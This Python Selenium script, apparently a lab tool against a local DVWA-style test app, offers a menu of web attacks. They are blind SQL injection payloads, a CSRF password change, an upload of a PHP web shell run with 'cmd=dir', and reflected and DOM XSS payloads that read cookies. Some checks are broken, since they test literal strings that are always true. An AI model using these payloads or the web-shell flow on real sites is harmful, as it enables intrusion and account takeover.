from concurrent.futures.process import _MAX_WINDOWS_WORKERS
from lib2to3.pgen2 import driver
from math import perm
import secrets
import time, re, argparse, requests
import re
import sys
import argparse
import requests
from urllib import parse
from selenium import webdriver
from urllib.parse import urlparse
from selenium import *
from selenium.webdriver.common.keys import Keys
from soupsieve import select


def login(driver, args):
    loginUrl = "http://localhost/login.php"
    driver.get(loginUrl)
    try:
        driver.find_element_by_name(args.elemid).send_keys(args.id)
        driver.find_element_by_name(args.elempw).send_keys(args.pw)
        driver.find_element_by_xpath(args.loginxpath).click()
        driver.implicitly_wait(5)
        time.sleep(3)
    except:
        print("login error")
        sys.exit()
    crawl(driver, args)
    return True

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-url', help='a')
    parser.add_argument('-id', help='a')
    parser.add_argument('-pw', help='a')
    parser.add_argument('-depth', help='a')
    parser.add_argument('-elemid', help='a')
    parser.add_argument('-elempw', help='a')
    parser.add_argument('-loginxpath', help='a')
    args = parser.parse_args()
    recursive = 4 if args.depth is None else args.depth
    
    if len(sys.argv) < 2:
        parser.print_help()
        sys.exit()
    if args.url is None:
        sys.exit()
    
    driver = webdriver.Chrome()
    time.sleep(3)
    driver.implicitly_wait(3)
    login(driver, args)

def crawl(driver, args):
    Url = args.url
    Parts = urlparse(args.url)
    scan_lists = {0: [Url]}

    if args.id is not None:
        # scan_info = [args.id, args.pw, Parts.netloc, args.elemid, args.elempw, args.loginxpath]
        # scan_url(driver, Url, scan_lists, scan_info)
        print("원하시는 공격을 선택하시오")
        print('-'*50)
        print(
            '1. sql_injection \n2. CSRF \n3. FileUpload \n4. DOM_XXS \n5. reflected_xxs \n6. 전체 \n7. 나가기'
            )
        sel_num = input()
        if sel_num == '1':
            sql_injection(driver)
            return crawl(driver, args)
        
        elif sel_num == '2':
            CSRF(driver)
            return crawl(driver, args)
        
        elif sel_num == '3':
            FileUpload(driver)
            return crawl(driver, args)
        
        elif sel_num == '4':    
            DOM_XXS(driver)
            return crawl(driver, args)
            
        elif sel_num == '5':
            reflected_xss(driver)
            return crawl(driver, args)
        
        elif sel_num == '6':    
            sql_injection(driver)
            CSRF(driver)
            FileUpload(driver)
            DOM_XXS(driver)
            #reflected_xss(driver)
            return crawl(driver, args)
        elif sel_num == '7':    
            print("exit")
        
        else:
            print("retry select number")
            return crawl(driver, args)
                      
        
def scan_url(driver, url, scan_lists, scan_info):
    tmp_url = scan_lists[0]
    target_url = tmp_url[0]
    target_url_parts = urlparse(target_url)
    #collection = {}
    #
    target_url_parts = urlparse(target_url)
    #
    target_domain = target_url_parts.netloc
    #
    split_domain = target_domain.split(".")
    #
    size = len(split_domain)
    if len(split_domain[size -1]) == 3:
        main_domain = split_domain[size -2] +"."+ split_domain[size -1]
    else:
        main_domain = split_domain[size -3]+"." + split_domain[size -2] + "." + split_domain[size -1]
        #
    driver.get(url)
    time.sleep(1)
    try:
        alert_result = driver.switch_to_alert()
        alert_result.dismiss()
    except:
        pass
    
    #
    file_extention_pattern = "(\.js|\.css|\.svg|\.png|\.jpeq|\.jpq|\.json|\.xml|\.woff|\.woff2)"
    file_extention_regx = re.compile(file_extention_pattern, re.I)
    tmp_urls = []
    match_objs = []
    url_pattern = "http(s)?:\/\/"
    url_regx = re.compile(url_pattern)
    try:
        elems = driver.find_elements_by_xpath("//a[@href]")
        for elem in elems:
            #
            if url_regx.match(elem.get_attribute("href")):
                link_parts = urlparse(elem.get_attribute("href"))
                #
                if link_parts.fragment == '':
                    tmp_urls.append(elem.get_attribute("href"))
                    
    except:
        pass

    for tmp_url in tmp_urls:
        if file_extention_regx.search(tmp_url):
            continue
        else:
            #
            if target_domain in tmp_url.split('/')[2]:
                match_objs.append(tmp_url)
                #
            else:
                try:
                    if main_domain in tmp_url.split('/')[2]:
                        if len(tmp_url.split('/')[2].split('.')[0].split('-')) > 1:
                            match_objs.append(tmp_url)
                except:
                    if main_domain in tmp_url.split('/')[2]:
                        match_objs.append(tmp_url)
                    
    print(match_objs)
    
    
def reflected_xss(driver):
    print("Reflected XSS Test")
    scan_url = "http://localhost/vulnerabilities/xss_r/?name=123"
    
    time.sleep(5)
    pattern = "<script>alert(12345)</script>"
    
    url_query = dict(parse.parse_qsl(parse.urlsplit(scan_url).query))
    print(url_query)
    time.sleep(5)
    for key in url_query:
        url_query[key] = pattern
        i = 0
        time.sleep(5)
        for value in url_query:
            if i == 0:
                split = '?'
                query = split + value + '=' + url_query[value]
            else:
                split = '&'
                query += split + value + '=' + url_query[value]
                i = i + 1
            test_url_xss = scan_url.split('?')[0] + query
            print('test_url_xss : ' + test_url_xss)
            time.sleep(3)
            alert_result = driver.switch_to.alert
            if '12345' in alert_result.text:
                print('[+] URL - ' + test_url_xss + ' : vuln')
                alert_result.dismiss()
            else:
                print('[+] pass1')            


def sql_injection(driver):
    print("SQL injection Test")
    scan_url = 'http://localhost/vulnerabilities/sqli_blind/?id=123&Submit=Submit'
    pattern_true = '1%27+and+1%3D1%23'
    pattern_false = '1%27+and+1%3D2%23'
    url_query = dict(parse.parse_qsl(parse.urlsplit(scan_url).query))
    #print(url_query)
    for key in url_query:
        url_query[key] = pattern_true
        print(url_query)
        i = 0
        for value in url_query:
            if i == 0:
                split = '?'
                query = split + value + '=' + url_query[value]
        i = i + 1
    test_url_true = scan_url.split('?')[0] + query
    print('test_url_true : ' + test_url_true)
    response_body_true = requests.get(test_url_true, verify=False, timeout=(5,10))
    url_query[key] = pattern_false
    i = 0

    for value in url_query:
        if i == 0:
            split = '?'
            query = split + value + '=' + url_query[value]
        else:
            split = '&'
            query += split + value + '=' + url_query[value]
            i = i + 1
        test_url_false = scan_url.split('?')[0] + query
        response_body_false = requests.get(test_url_false, verify=False, timeout=(5,10))
        time.sleep(1)
        redirect_codes = [red for red in range(300, 311, 1)]
        if str(response_body_true.status_code) in str(redirect_codes):
            print('pass1')
            pass
        elif response_body_true.text != response_body_false.text and 'result":"5' not in response_body_true.text:
            print('[+] URL - ' + test_url_false + ' : vuln')
        else:
            print('pass3')
    
    if 'User ID exists in the database':
        print('User ID exists in the database')
    


def CSRF(driver):
    print("CSRF Test")
    parts = urlparse('http://localhost/vulnerabilities/csrf/?password_new=&password_conf=&Change=Change#')
    url_query = dict(parse.parse_qsl(parts.query))
    print(url_query)
    url_query['password_new'] = 'password'
    url_query['password_conf'] = 'password'
    parts = parts._replace(query=parse.urlencode(url_query))

    
    new_url = parse.urlunparse(parts)
    time.sleep(3)
    driver.get(new_url)
    
    
    print('[+] URL - ' + new_url + ' : vnln') 
    search_box = driver.find_element_by_xpath('//*[@id="main_body"]/div/div/pre')    
    if 'Password Changed.' in search_box.text :
        print("[+] CSRF Sucess Text - " + search_box.text)

    else :
        print("pass1")
    
    if 'Password Changed':
        print('Password Changed')
    else:
        print("AC")
    

def FileUpload(driver):
    print("Fileupload")
    driver.get('http://localhost/vulnerabilities/upload/')
    driver.find_element_by_css_selector("input[name='uploaded']").send_keys("C:\WEB\ph.php")
    driver.find_element_by_css_selector("input[type='submit']").click()
    
    if '../../hackable/uploads/ph.php succesfully uploaded!':
        file_url = driver.current_url
        print(file_url)
        driver.get("http://localhost/hackable/uploads/ph.php?cmd=dir")
        time.sleep(3)
        driver.maximize_window()
        driver.save_screenshot('C:/WEB/fileupload.png')
        time.sleep(3)
        print("screenshot complete")
        time.sleep(3)
    else:
        print('retry')
        
        
def DOM_XXS(driver):
    print("DOM_XXS START")
    scan_url = ('http://localhost/vulnerabilities/xss_d/?default=')
    time.sleep(3)
    url_query = dict(parse.parse_qsl(parse.urlsplit(scan_url).query))
    print(url_query)
    time.sleep(3)
    query = '<script>alert(document.cookie)</script>'
    
    test_url_true = scan_url + query
    print('test_url_true : ' + test_url_true)
    driver.get(test_url_true)
   
    alert = driver.switch_to_alert()
    print(alert.text)
    time.sleep(1)
    alert.accept()
    time.sleep(5)
    

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("exit program")
        sys.exit()
        

